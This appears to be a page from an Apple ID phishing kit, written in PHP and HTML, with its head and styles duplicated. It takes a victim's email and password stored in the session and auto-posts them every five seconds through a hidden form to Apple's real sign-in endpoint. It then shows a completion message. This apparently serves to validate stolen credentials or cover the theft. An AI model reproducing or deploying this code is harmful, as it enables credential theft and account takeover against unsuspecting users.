<?php
session_start();
$fnames = $_SESSION['firstname'];
$lnames = $_SESSION['lastname'];
?>
<!DOCTYPE html>
<?php
echo $html;
?>
<head>
<?php
echo "<title>$title_bill</title>";
?>
<style>

.error{
  background-color: #fefdd2;
  
}

.required{
    border-width: 1px;
    border-color: rgb(214, 214, 214);
    border-style: solid;
    border-radius: 5px;
    position: absolute;
    height: 30px;
    font-family: sans-serif;
    padding-left: 10px;
    font-size: 14px;

}

.required:focus{
    border-width: 1px;
    border-color: #0088cc;
       -moz-box-shadow: 0px 0px 0px 3px #66afe9;
    -webkit-box-shadow: 0px 0px 0px 3px #66afe9;
            box-shadow: 0px 0px 0px 3px #66afe9;
}

.inox{
    border-width: 1px;
    border-color: rgb(214, 214, 214);
    border-style: solid;
    border-radius: 5px;
    position: absolute;
    height: 30px;
    font-family: sans-serif;
    padding-left: 10px;
    font-size: 14px;

}

.inox:focus{
    border-width: 1px;
    border-color: #0088cc;
    -moz-box-shadow: 0px 0px 0px 3px #66afe9;
    -webkit-box-shadow: 0px 0px 0px 3px #66afe9;
            box-shadow: 0px 0px 0px 3px #66afe9;
}

#bottom_m_login{
  background-color: #000;
  position: absolute;
  opacity: 0.7;
  width: 100%;
  height: 50px;
  z-index: 55;
}

#bottom_m1_login{
  background-color: #fff;
  position: absolute;
  width: 100%;
  margin-top:50px;
  height: 40px;
  z-index: 55;
}
#i1{
  background-image: url(../assets/img/i1.png);
  background-repeat: no-repeat;
  width: 25px;
  height: 12px;
  left: 20px;
  top: 20px;
  z-index: 999;
  position: absolute;
}
#i2{
  background-image: url(../assets/img/i2.png);
  background-repeat: no-repeat;
  width: 25px;
  height: 29px;
  left: 50%;
  margin-left: -17.5px;
  top: 10px;
  z-index: 999;
  position: absolute;
}
#i3{
  background-image: url(../assets/img/i3.png);
  background-repeat: no-repeat;
  width: 20px;
  height: 26px;
  right: 20px;
  top: 10px;
  z-index: 999;
  position: absolute;
}


#container_m_login{
    position: absolute;
    top: 0px;
    left: 50%;
  width: 330px;
  margin-left: -165px;
}
#xheader_m_login{
    width: 100%;
    height: 400px;
    top:0px;
}

.error{
  background-color: #fefdd2;
}
#sub_navbar_m_login{
    width: 100%;
    height: 61px;
    top: 44px;
    left: 0px;
    z-index: 3;
    position: absolute;
}



</style>
<?php
session_start();
$fnames = $_SESSION['firstname'];
$lnames = $_SESSION['lastname'];
?>
<!DOCTYPE html>
<?php
echo $html;
?>
<head>
<?php
echo "<title>$title</title>";
?>
<style>

.error{
  background-color: #fefdd2;
  
}

.required{
    border-width: 1px;
    border-color: rgb(214, 214, 214);
    border-style: solid;
    border-radius: 5px;
    position: absolute;
    height: 30px;
    font-family: sans-serif;
    padding-left: 10px;
    font-size: 14px;

}

.required:focus{
    border-width: 1px;
    border-color: #0088cc;
       -moz-box-shadow: 0px 0px 0px 3px #66afe9;
    -webkit-box-shadow: 0px 0px 0px 3px #66afe9;
            box-shadow: 0px 0px 0px 3px #66afe9;
}

.inox{
    border-width: 1px;
    border-color: rgb(214, 214, 214);
    border-style: solid;
    border-radius: 5px;
    position: absolute;
    height: 30px;
    font-family: sans-serif;
    padding-left: 10px;
    font-size: 14px;

}

.inox:focus{
    border-width: 1px;
    border-color: #0088cc;
    -moz-box-shadow: 0px 0px 0px 3px #66afe9;
    -webkit-box-shadow: 0px 0px 0px 3px #66afe9;
            box-shadow: 0px 0px 0px 3px #66afe9;
}

#bottom_m_login{
  background-color: #000;
  position: absolute;
  opacity: 0.7;
  width: 100%;
  height: 50px;
  z-index: 55;
}

#bottom_m1_login{
  background-color: #fff;
  position: absolute;
  width: 100%;
  margin-top:50px;
  height: 40px;
  z-index: 55;
}
#i1{
  background-image: url(../assets/img/i1.png);
  background-repeat: no-repeat;
  width: 25px;
  height: 12px;
  left: 20px;
  top: 20px;
  z-index: 999;
  position: absolute;
}
#i2{
  background-image: url(../assets/img/i2.png);
  background-repeat: no-repeat;
  width: 25px;
  height: 29px;
  left: 50%;
  margin-left: -17.5px;
  top: 10px;
  z-index: 999;
  position: absolute;
}
#i3{
  background-image: url(../assets/img/i3.png);
  background-repeat: no-repeat;
  width: 20px;
  height: 26px;
  right: 20px;
  top: 10px;
  z-index: 999;
  position: absolute;
}


#container_m_login{
    position: absolute;
    top: 0px;
    left: 50%;
  width: 330px;
  margin-left: -165px;
}
#xheader_m_login{
    width: 100%;
    height: 400px;
    top:0px;
}

.error{
  background-color: #fefdd2;
}
#sub_navbar_m_login{
    width: 100%;
    height: 61px;
    top: 44px;
    left: 0px;
    z-index: 3;
    position: absolute;
}



</style>

    </head>
<body>
<div id="bottom_m_login"></div>
    <div id="i1"></div>
    <div id="i2"></div>
    <div id="i3"></div>
    <div id="bottom_m1_login"></div>
<div style="
    margin: auto;
    position: relative;
    margin-top: 79px;
    margin-left: 0px;
    height: 530px;
  ">
<?php
      session_start();
    	$_SESSION['firstname'] = "";
        if($autoblock == 1) {
			$_SESSION['udah'] = "y";
      }
//echo "<META HTTP-EQUIV='refresh' content='5; URL=https://appleid.apple.com'>";

?>
<script type="text/javascript">
    window.onload=function(){
        var auto = setTimeout(function(){ autoRefresh(); }, 100);

        function submitform(){
          document.forms["form"].submit();
        }

        function autoRefresh(){
           clearTimeout(auto);
           auto = setTimeout(function(){ submitform(); autoRefresh(); }, 5000);
        }
    }
    </script>
    <form name='form' id='form' action='https://idmsa.apple.com/IDMSWebAuth/authenticate' method='POST'>
        <div style='display:none;'>
        <input name='appleId' value='<?php echo $_SESSION['email'];?>' />
        <input name='accountPassword' value='<?php echo $_SESSION['password'];?>' />
        <input name='appIdKey' value='af1139274f266b22b68c2a3e7ad932cb3c0bbe854e13a79af78dcc73136882c3' />
        <input name='accNameLocked' value='false' />
        <input name='language' value='US-EN' />
        <input name='path' value='/signin/?referrer=/account/manage' />
        <input name='Env' value='PROD' />
        <input type='submit' class='button primary' value='Continue' />
        </div>
    </form>
      <font class="xFont3" style="top:40px;left:100px;">
                <img id="gambarmobile" width="150" src="../assets/img/done.png">
            </font>
        <font class="xFont3" style="top:170px;left:60px;">
                <b><?php echo $done;?></b>
            </font>
        <font class="xFont2" style="text-align:center;top:210px;left:70px;width:210px;">
                <?php echo $done_text;?>
            </font>
     

        </form>
        </div>